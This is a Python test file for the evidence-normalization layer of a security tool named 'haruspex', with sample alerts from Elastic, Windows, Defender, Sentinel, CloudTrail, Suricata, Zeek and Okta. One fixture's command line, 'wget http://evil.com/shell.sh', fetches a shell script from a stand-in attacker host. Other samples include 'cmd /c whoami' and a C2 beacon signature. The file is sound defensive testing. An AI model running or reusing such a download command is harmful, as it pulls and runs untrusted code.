"""Tests for the evidence normalization and rendering layer (evidence.py)."""

import json

from haruspex.evidence import (
    from_cloudtrail, from_defender_alert, from_ecs, from_okta,
    from_sentinel_alert, from_suricata, from_windows_event, from_zeek,
    normalize, render, to_text,
)


def test_normalize_ecs():
    doc = {"event": {"kind": "alert", "severity": "high", "action": "blocked"},
           "rule": {"name": "Malware detected"},
           "process": {"executable": "/usr/bin/wget", "command_line": "wget http://evil.com/shell.sh"},
           "host": {"name": "prod-web-01"}}
    ev = normalize(doc)
    assert ev is not None
    assert ev["source"] == "Elastic"
    assert ev["title"] == "Malware detected"
    text = render(ev)
    assert "Malware detected" in text
    assert "wget" in text


def test_normalize_windows_event():
    doc = {"EventID": "4625", "Channel": "Security",
           "TargetUserName": "admin", "TargetDomainName": "CORP",
           "IpAddress": "10.0.0.5", "LogonType": "10"}
    ev = normalize(doc)
    assert ev is not None
    assert ev["source"] == "Windows"
    assert "CORP\\admin" in ev.get("user", "")


def test_normalize_windows_evtx_nested():
    doc = {"Event": {"System": {"EventID": "1", "Channel": "Sysmon", "Computer": "WS01"},
                     "EventData": {"Image": "C:\\Windows\\cmd.exe",
                                   "CommandLine": "cmd /c whoami",
                                   "ParentImage": "C:\\Windows\\explorer.exe"}}}
    ev = normalize(doc)
    assert ev is not None
    assert ev["process"]["image"] == "C:\\Windows\\cmd.exe"


def test_normalize_defender_alert():
    doc = {"title": "Suspicious PowerShell", "severity": "medium",
           "serviceSource": "Microsoft Defender for Endpoint",
           "mitreTechniques": ["T1059.001"],
           "evidence": [{"@odata.type": "#microsoft.graph.security.processEvidence",
                         "fileName": "powershell.exe", "roles": ["contextual"]}]}
    ev = normalize(doc)
    assert ev is not None
    assert ev["source"] == "Microsoft Defender for Endpoint"
    assert "T1059.001" in ev["techniques"]


def test_normalize_sentinel_alert():
    doc = {"AlertName": "Brute force attack", "AlertSeverity": "High",
           "ProductName": "Microsoft Sentinel",
           "Tactics": "InitialAccess", "Entities": json.dumps([{"Type": "ip", "Address": "1.2.3.4"}])}
    ev = normalize(doc)
    assert ev is not None
    assert "Brute force" in ev["title"]


def test_normalize_cloudtrail():
    doc = {"eventSource": "iam.amazonaws.com", "eventName": "CreateUser",
           "userIdentity": {"arn": "arn:aws:iam::123:root", "type": "Root"},
           "sourceIPAddress": "198.51.100.1", "awsRegion": "us-east-1"}
    ev = normalize(doc)
    assert ev is not None
    assert "CreateUser" in ev["title"]
    assert ev["user"] == "arn:aws:iam::123:root"


def test_normalize_cloudtrail_records():
    doc = {"Records": [
        {"eventSource": "s3.amazonaws.com", "eventName": "GetBucketAcl",
         "userIdentity": {"arn": "arn:aws:iam::123:user/alice"}, "awsRegion": "eu-west-1"}
    ]}
    result = normalize(doc)
    assert isinstance(result, list)
    assert len(result) == 1


def test_normalize_suricata():
    doc = {"event_type": "alert", "src_ip": "10.0.0.1", "dest_ip": "192.168.1.1",
           "dest_port": 443, "proto": "TCP",
           "alert": {"signature": "ET MALWARE CnC Beacon", "severity": 1, "action": "allowed",
                     "category": "A Network Trojan was detected"}}
    ev = normalize(doc)
    assert ev is not None
    assert "CnC Beacon" in ev["title"]


def test_normalize_zeek():
    doc = {"uid": "CYbbOi4amZTMz8ZXk7", "id.orig_h": "10.0.0.5", "id.resp_h": "93.184.216.34",
           "id.resp_p": 80, "proto": "tcp", "service": "http",
           "host": "example.com", "uri": "/malware.exe"}
    ev = normalize(doc)
    assert ev is not None
    assert ev["network"]["src_ip"] == "10.0.0.5"


def test_normalize_okta():
    doc = {"eventType": "user.session.start", "displayMessage": "User login to Okta",
           "severity": "INFO", "outcome": {"result": "SUCCESS"},
           "actor": {"alternateId": "user@example.com"},
           "client": {"ipAddress": "1.2.3.4"},
           "target": [{"type": "AppUser", "alternateId": "user@example.com"}]}
    ev = normalize(doc)
    assert ev is not None
    assert ev["user"] == "user@example.com"


def test_normalize_unknown():
    assert normalize({"random": "data", "no": "match"}) is None
    assert normalize("just a string") is None
    assert normalize(42) is None


def test_normalize_canonical_passthrough():
    doc = {"schema": "haruspex.evidence/1", "source": "custom", "title": "test"}
    assert normalize(doc) == doc


def test_render_empty():
    text = render({})
    assert isinstance(text, str)


def test_render_list():
    evs = [{"source": "A", "title": "first"}, {"source": "B", "title": "second"}]
    text = render(evs)
    assert "[1]" in text
    assert "[2]" in text


def test_to_text_known():
    doc = {"EventID": "4624", "Channel": "Security", "TargetUserName": "admin"}
    text = to_text(doc)
    assert text is not None
    assert "admin" in text


def test_to_text_unknown():
    assert to_text({"unrecognized": True}) is None
